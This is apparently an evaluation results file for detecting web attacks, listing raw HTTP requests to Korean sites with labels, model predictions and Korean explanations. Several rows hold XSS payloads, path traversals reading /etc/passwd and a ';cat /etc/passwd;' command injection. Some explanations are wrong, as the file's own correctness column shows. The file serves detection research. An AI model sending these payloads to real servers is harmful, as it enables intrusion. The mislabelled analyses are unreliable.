Unnamed: 0,payload,label,code,CVE,cluster,pred,correct,result
7670,"GET /?xuid=1&sv=20100707&url=http%3A//seoji.nl.go.kr/landingPage/SearchList.do&xlnk=javascript%3AallBasket%28%20insert%20%29%3Breturnfalse&xidx=0&crn=0.713959322017967& HTTP/1.1\r\nHost: weblog.nl.go.kr:8000\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Edg/89.0.774.63\r\nAccept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8\r\nReferer: http://seoji.nl.go.kr/\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: ko,en;q=0.9,en-US;q=0.8\r\nCookie: PCID=438631cf-1927-348e-bc8d-2e5679effd4f-1615339745231; _ga=GA1.3.1658973355.1615339747; _INSIGHT_CK_1101=eb10230cebc93187345c89834a8db775_40003|08f6dd22733f823ee27289834a8db775_40003:1615343062000; GsCK_AC=1617371162216514667; GsTDMY_23=TM_1^TV_2109122^DY_1^DV_21091^WY_1^WV_2113^MH_1^MV_2104^YR_1^YV_121^PD_21091; GsTS_23=TS|1617371162219314667^RS|bookmark|1617371162219314667^BS|0^IS||0^AS|0|^; _gid=GA1.3.235764261.1617371162; Gsurl_23=seoji.nl.go.kr%2FlandingPage%2FSearchList.do; Gsbref_23=seoji.nl.go.kr%2FlandingPage%2Fbasket%2FbasketSearchList.do; _INSIGHT_CK_1121=af0cbe1887aab24de356ab2e9468124a_71161|df743e1a67e0e058330eab2e9468124a_71161:1617373597000",0,Not Attack,,39,0,True,"주어진 페이로드를 분석한 결과, 이는 일반적인 HTTP GET 요청으로 보입니다. 특이한 점이나 악의적인 의도가 드러나지 않으므로 이는 공격이 아닌 것으로 판단됩니다. 따라서 공격 여부는 0(비공격)으로 판단됩니다."
109924,"GET /phpMyAdmin-2.8.0.2/ HTTP/1.1
Host: 210.113.47.112
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: deflate, gzip, identity
Accept-Language: en-US;q=0.6,en;q=0.4
Referer: http://210.113.47.112/
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1

",1,,,39,0,False,"주어진 페이로드를 분석한 결과, 이는 phpMyAdmin 버전 2.8.0.2에 대한 요청을 하는 HTTP GET 요청입니다. 따라서 이 요청은 단순히 웹 서버의 특정 경로에 대한 요청으로 보여지며, 공격으로 분류되지 않습니다. 따라서 공격 여부는 0(비공격)으로 판단됩니다."
34771,"GET /webzine/03_data/03_01_veiw.asp?idx=2383&page=3&c_idx=89&searchString=""><script>alert('kokot');</script> HTTP/1.1Accept: Text/Html,Application/Xhtml Xml,Application/Xml;Q=0.9,*/*;Q=0.8Connection: keep-aliveUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Rv:50.0) Gecko/20100101 Firefox/50.0Accept-Language: en-us,en;q=0.5Accept-Encoding: gzipCookie: ASPSESSIONIDCQACBAAT=LIBJMDGBPKBMJNMAJLFHPNFFHost: www.gokams.or.kr",1,XSS,,39,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : ""><script>alert('kokot');</script>
공격 유형 : Cross-Site Scripting (XSS)
해당 Payload는 웹 어플리케이션의 취약점을 이용하여 사용자의 브라우저에 악의적인 스크립트를 주입하는 Cross-Site Scripting (XSS) 공격입니다. 이 공격은 사용자가 해당 웹페이지를 방문할 때 스크립트가 실행되어 개인 정보를 탈취하거나 세션을 탈취하는 등의 악의적인 행위를 할 수 있습니다."
51437,"GET /cckri/cmmn/downloadAttachFileMime.do?classCode=HPPUBLISH&classSeq=130&attachSeq=3&attachSaveName=20160309132303_jeishehqmdipqqr.pdf HTTP/1.1
Host: ri.ccourt.go.kr
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-A315N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://www.google.com/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-US;q=0.6,en;q=0.5,ja-JP;q=0.4,ja;q=0.3

",0,Not Attack,,39,0,True,"주어진 Payload는 HTTP GET 요청을 보여주고 있습니다. 이 요청은 특정 웹 서버에 파일을 다운로드하기 위한 것으로 보입니다. 따라서 이 Payload는 공격이 아닌 일반적인 웹 요청으로 분류될 수 있습니다.

따라서,
- 공격 여부(0:비공격, 1:공격) : 0 (비공격)
- 공격 구문 : 해당하지 않음
- 공격 유형 : 해당하지 않음"
51573,"GET /common/board/Download.do?bcIdx=940911&cbIdx=1121&streFileNm=20150417180707_nqvtpyuohelxsiy.xls HTTP/1.1
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*
Accept-Language: ko
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; SMJB; rv:11.0; ; NCLIENT50_AAPA38F4D1CC15) like Gecko
Connection: Close
Cache-Control: no-cache
Host: www.ccourt.go.kr

",0,Not Attack,,39,0,True,"주어진 Payload는 웹 서버에 GET 요청을 보내는 것으로 보입니다. 이 요청은 특별히 악의적인 의도를 갖고 만들어진 것으로 보이지 않습니다. 따라서 이 요청은 공격으로 분류되지 않습니다.

따라서,
공격 여부(0:비공격, 1:공격) : 0
공격 구문 : 없음
공격 유형 : N/A (비공격)"
67222,"GET /.  ./.  ./.  ./.  ./.  ./.  ./etc/passwd#vt/test HTTP/1.1Connection: CloseHost: 218.144.26.22:8080Pragma: no-cacheCache-Control: no-cacheUser-Agent: Mozilla/5.0 [en] (X11, U; OpenVAS-VT 9.0.3)Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*Accept-Language: enAccept-Charset: iso-8859-1,*,utf-8",1,,,39,1,True,"주어진 페이로드는 HTTP GET 요청을 나타내는 것으로 보입니다. 요청 라인에서는 서버 루트 디렉토리(/)로의 요청을 나타내고 있습니다. 그러나 페이로드의 끝 부분에 있는 ""/etc/passwd""는 일반적으로 시스템의 중요한 파일인 패스워드 파일에 접근하려는 시도를 보여줍니다. 이는 대상 시스템의 보안을 침해하려는 시도로 해석될 수 있습니다.

따라서 이 페이로드는 공격으로 간주될 수 있으며, 공격 여부를 1(공격)로 판단할 수 있습니다. 해당 페이로드는 시스템의 중요한 파일에 액세스하려는 시도를 포함하고 있으며, 이는 서버의 보안에 대한 위협이 될 수 있습니다."
34919,"GET /ap/ch/tpt/javascript:getBusInfoDetail(4721); HTTP/1.1
Accept-Encoding: gzip, deflate
Host: www.airport.kr
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 YisouSpider/5.0 Safari/537.36
accept: */*
accept-language: zh-CN,zh;q=0.9
Connection: close",0,Not Attack,,39,0,True,"이 Payload는 HTTP GET 요청을 보내는 것으로 보이지만 특별히 악의적인 의도가 드러나지는 않습니다. 따라서 이는 공격으로 판단되지 않으며, 공격 여부는 0(비공격)으로 판단됩니다.

이 요청은 특정 버스 정보를 가져오는 것으로 보이며, 일반적인 웹 애플리케이션에서 자주 사용되는 패턴입니다. 요청 헤더에는 일반적인 브라우저 사용자 에이전트와 호스트 정보가 포함되어 있습니다. 따라서 이 요청은 주로 웹 애플리케이션에서 데이터를 가져오기 위한 목적으로 사용될 것으로 예상됩니다."
40378,"GET /ap/ch/tpt/javascript:getBusInfoDetail(4771); HTTP/1.1
Host: www.airport.kr
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: Close
User-Agent: Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)
Accept-Language: en,zh;q=0.1
Accept-Encoding: gzip, deflate",0,Not Attack,,39,0,True,주어진 Payload는 일반적인 HTTP GET 요청으로 보입니다. 특이한 점이나 악의적인 의도를 발견할 수 없으므로 이는 공격으로 간주되지 않습니다. 따라서 공격 여부는 0(비공격)입니다.
68361,"GET /cover/download.php?uploadDir=../../fine_upload/cover/&subUploadDir=&filename=279.jpg HTTP/1.1Host: www.outdoornews.co.krConnection: keep-aliveUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8Referer: http://www.outdoornews.co.kr/news/articleView.html?idxno=15711Accept-Encoding: gzip, deflateAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=vrre6ks7nod83vdfqf1eukjrv3; __utma=170096190.773422387.1674038801.1674038801.1674038801.1; __utmc=170096190; __utmz=170096190.1674038801.1.1.utmcsr=naver|utmccn=(organic)|utmcmd=organic|utmctr=  ũ ׸      ǰ   ; __utmt=1; __utmb=170096190.2.10.1674038801; dable_uid=65750485.1627452042141; _ga=GA1.3.773422387.1674038801; _gid=GA1.3.1301166979.1674038801",0,Not Attack,,39,1,False,"해당 페이로드는 보여주신 내용에서 HTTP 요청 헤더로 이루어져 있습니다. 이 페이로드는 서버에 GET 요청을 보내는 것을 시도하고 있습니다. 특히 `GET /cover/download.php?uploadDir=../../fine_upload/cover/&subUploadDir=&filename=279.jpg HTTP/1.1` 부분에서는 파일 다운로드를 시도하는 것으로 보입니다. 이러한 요청이 공격인지 여부를 판단하기 위해서는 추가적인 정보가 필요합니다. 

공격 여부(0:비공격, 1:공격) : 1 (공격)

공격 구문 : GET /cover/download.php?uploadDir=../../fine_upload/cover/&subUploadDir=&filename=279.jpg HTTP/1.1

공격 유형 : 디렉터리 이상 접근(Directory Traversal) 공격으로 보입니다. uploadDir 파라미터를 통해 상위 디렉터리로 이동하여 미리 정의되지 않은 디렉터리에 접근을 시도하는 것으로, 서버의 보안 취약점을 이용하여 파일 시스템에 접근하려는 시도로 해석될 수 있습니다. 

이유 : uploadDir 파라미터를 통해 상위 디렉터리로 이동하고자 하는 시도가 있으며, filename 파라미터를 통해 특정 파일을 다운로드하려는 시도가 있습니다. 이는 서버의 파일 시스템에 접근하려는 악의적인 시도로 해석될 수 있습니다."
111696,"GET /jeongeup/data/apms/background/roll_banner_10.jpg HTTP/1.1
Host: jeongeup.miress.gethompy.com
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://xn--zb0bp61arxc6zit2ak3efz9a.com/
Accept-Encoding: gzip, deflate
Accept-Language: ko,en;q=0.9,en-US;q=0.8

",0,Not Attack,,39,0,True,"주어진 정보는 HTTP 요청 페이로드를 보여주고 있습니다. 이 요청은 웹 서버에 특정 이미지 파일을 요청하는 것으로 보입니다. Host 헤더에서 요청이 전송된 도메인은 ""jeongeup.miress.gethompy.com""이며, Referer 헤더에서는 해당 요청이 어떤 웹페이지에서 발생했는지를 알려주고 있습니다.

공격 여부 판단은 이 요청이 단순히 이미지 파일을 가져오는 일반적인 요청으로 보이므로 비공격(0)으로 판단됩니다. 이 요청은 웹페이지에서 이미지를 표시하기 위한 것으로 보이며, 공격적인 의도가 없습니다.

따라서,

공격 여부(0:비공격, 1:공격) : 0
공격 구문 : 없음
공격 유형 : 해당 요청은 이미지 파일을 가져오는 일반적인 요청으로 보입니다."
52088,"GET /market/main/big.html?item_no=237&file=../../co_img/dawonsystem/item_big_237_%C7%F9%C2%F87.jpg HTTP/1.1
Host: dawonmp.kr
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://dawonmp.kr/market/main/product_info.html?mart_id=dawonsystem&category_num=65&flag=&item_no=237&page=2&mode=
Accept-Encoding: gzip, deflate
Accept-Language: ko,en;q=0.9,en-US;q=0.8
Cookie: PHPSESSID=18aef32095fd64c7588ff693f492e599",0,Not Attack,,39,0,True,"해당 요청을 보면 HTTP GET 메서드를 사용하여 '/market/main/big.html' 경로에 존재하는 이미지 파일을 요청하고 있습니다. 이 요청은 일반적인 웹 페이지 요청으로 보이며, 특이한 점이나 공격적인 패턴은 보이지 않습니다. 따라서 이 요청은 공격이 아니라고 판단되어 공격 여부를 0(비공격)으로 판단됩니다."
23567,"GET /eng/films/index/filmsView.jsp?userId='[0]&peopleCd=&strMenuId=010401&category=ALL&mode=INDEX_FILMS_LIST&searchKeyword=hide%20and%20seek&pageIndex=1&searchType=ALL&movieCd=20136049&s_genre=ALL&pageRowSize=10 HTTP/1.1\nAccept: Text/Html,Application/Xhtml Xml,Application/Xml;Q=0.9,*/*;Q=0.8\nConnection: keep-alive\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Rv:50.0) Gecko/20100101 Firefox/50.0\nAccept-Language: en-us,en;q=0.5\nAccept-Encoding: gzip\nCookie: JSESSIONID=7A10A9AF51BD43AB0977C2C97CD67339\nHost: www.koreanfilm.or.kr",0,Not Attack,,39,1,False,"해당 페이로드는 일반적인 웹 요청처럼 보이지만, userId 파라미터에 SQL Injection 공격을 시도하는 것으로 보입니다. userId 파라미터에 '[0]'와 같이 SQL 쿼리를 주입하려는 시도가 있습니다. 이는 악의적인 사용자가 데이터베이스에 액세스하거나 데이터를 조작하려는 시도일 수 있습니다.

따라서, 이 페이로드는 공격으로 분류되며 공격 여부를 1로 판단합니다. SQL Injection은 주로 웹 애플리케이션 취약점 공격 중 하나로, 악의적인 SQL 쿼리를 주입하여 데이터베이스를 비정상적으로 조작하는 공격 유형입니다. 이 경우, 보안 조치가 필요한 상황이므로 즉시 조치가 필요합니다."
38898,"HEAD /javascript:window.print(); HTTP/1.1Connection: CloseCache-control: no-cacheHost: kcti.re.krAccept: text/html, application/xhtml+xml, */*Accept-Charset: utf-8User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",0,Not Attack,,39,-1,False,"주어진 페이로드는 HTTP 요청 헤더를 포함하는 것으로 보이지만, 실제로는 HTTP 요청의 일부분만을 포함하고 있습니다. 따라서 단독으로는 공격 여부를 판단하기 어렵습니다.

일반적으로 HTTP 요청에 포함된 헤더 정보만으로는 공격 여부를 명확히 판단하기 어렵습니다. 헤더 정보 외에도 HTTP 요청의 내용이나 목적지 등을 고려해야 합니다. 

만약 주어진 페이로드가 전체 HTTP 요청의 일부분이라면, 해당 요청이 서버에게 보내질 때 어떤 동작을 유발할지를 고려하여 공격 여부를 판단할 수 있습니다. 혹시 추가 정보가 있다면 그 정보를 공유해주시면 더 자세한 분석을 할 수 있을 것입니다."
16735,"GET /eng/publications/books.jsp?catCd=640104&searchKeyword=Cinematic%20Competence%20of%20Asia%20and%20Vision%20for%20Co-prosperity HTTP/1.1\nHost: www.koreanfilm.or.kr\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://msearch.kobiz.or.kr/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\nCookie: __utmc=23312928; __utmz=23312928.1613242101.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); JSESSIONID=DE962D717AC1FA212FA76291C9B1C34F; __utma=23312928.356767619.1613242101.1613242101.1613293397.2; __utmt=1; __utmb=23312928.7.10.1613293397",0,Not Attack,,39,0,True,"공격 여부(0:비공격, 1:공격) : 0
공격 구문 : 없음
공격 유형 : 이 요청은 단순한 GET 요청으로 보이며, 특이한 점이나 악의적인 요소가 없습니다. 호스트인 www.koreanfilm.or.kr의 특정 페이지에 대한 정보를 요청하는 것으로 보입니다."
39281,"GET /?mapp_iframe=1&mapid=--%3E%3Cimg%20src%20onerror=alert(document.domain)%3E HTTP/1.1Host: www.korean.go.krUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36Connection: closeAccept: */*Accept-Language: enAccept-Encoding: gzip",1,XSS,,40,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : <img src onerror=alert(document.domain)>
공격 유형 : 크로스 사이트 스크립팅(XSS) 공격
이유 : GET 요청의 mapp_iframe 및 mapid 매개변수에 주입된 코드가 페이지에 삽입되어 사용자의 브라우저에서 스크립트가 실행되는 XSS 공격을 시도하고 있습니다. 페이지는 사용자 입력을 적절히 필터링하거나 이스케이핑하지 않아 발생한 보안 취약점으로 인한 공격입니다."
43498,"GET /msa/../../../../../../../../etc/passwd HTTP/1.1Host: art.karts.ac.krUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36Connection: closeAccept: */*Accept-Language: enAccept-Encoding: gzip",1,PT,,40,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : GET /msa/../../../../../../../../etc/passwd
공격 유형 : 디렉토리 이동 및 파일 읽기 공격
이유 : GET 요청으로 경로 탐색을 시도하여 /etc/passwd 파일을 읽으려는 시도가 있음. 이는 시스템 정보를 노출시키는 보안 취약점을 악용할 수 있는 일반적인 웹 애플리케이션 공격 중 하나이다."
51374,"GET /wp-includes/sym404/root/etc/passwd HTTP/1.1Host: english.koreanpc.krUser-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36Connection: closeAccept: */*Accept-Language: enAccept-Encoding: gzip",1,FD,,40,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : GET /wp-includes/sym404/root/etc/passwd HTTP/1.1
공격 유형 : 디렉토리 탐색(패스워드 파일에 대한 요청)
이유 : 해당 요청은 사용자의 패스워드 파일에 접근하려는 시도로 보여지며, 디렉토리 탐색 공격의 일종으로 분류됩니다. 이러한 요청은 웹 서버의 보안에 위협을 가할 수 있으므로 즉시 차단해야 합니다."
67683,"GET /elfinder/php/connector.minimal.php?cmd=file&download=1&target=l1_<@base64>/var/www/html/elfinder/files//..//..//..//..//..//../etc/passwd<@/base64> HTTP/1.1Host: kvh.kopri.re.krUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedAccept-Encoding: gzip",1,,,40,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : GET /elfinder/php/connector.minimal.php?cmd=file&download=1&target=l1_<@base64>/var/www/html/elfinder/files//..//..//..//..//..//../etc/passwd<@/base64> HTTP/1.1
공격 유형 : 경로 조작 공격
이유 : 이 요청은 경로 탐색을 이용하여 웹 서버의 루트 디렉토리 이상의 파일인 /etc/passwd 파일에 접근하려는 시도를 보여줍니다. 이는 시스템 정보 유출을 목적으로 하는 공격으로 간주될 수 있습니다."
42898,"GET /downloader.php?file=../../../../../../../../../../../../../etc/passwd%00.jpg HTTP/1.1Host: www.ehistory.go.krUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36Connection: closeAccept: */*Accept-Language: enAccept-Encoding: gzip",1,PT,,40,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : GET /downloader.php?file=../../../../../../../../../../../../../etc/passwd%00.jpg HTTP/1.1
공격 유형 : 디렉터리 탐색 공격 (Directory Traversal Attack)
이유 : 위 요청은 파일 시스템 내의 디렉터리 구조를 탐색하려는 시도로 보여집니다. 공격자는 ""../../../../../../../../../../../../../etc/passwd%00.jpg"" 부분을 통해 웹 서버의 루트 디렉터리에서 /etc/passwd 파일을 읽으려고 시도하고 있습니다. 이는 시스템의 중요한 정보인 사용자 계정 정보가 포함된 파일에 접근하려는 악의적인 목적을 가진 공격입니다."
67244,"GET /api/ping?count=5&host=;cat /etc/passwd;&port=80&source=1.1.1.1&type=icmp HTTP/1.1Host: meic.krUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36Connection: closeAccept: */*Accept-Language: enAccept-Encoding: gzip",1,,,40,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : GET /api/ping?count=5&host=;cat /etc/passwd;&port=80&source=1.1.1.1&type=icmp HTTP/1.1
공격 유형 : Command Injection (명령 인젝션)
이유 : 해당 Payload에는 /etc/passwd 파일을 읽는 명령어인 "";cat /etc/passwd;""이 포함되어 있어, 시스템에 악의적인 명령어를 삽입할 수 있는 Command Injection 공격이 포함되어 있습니다."
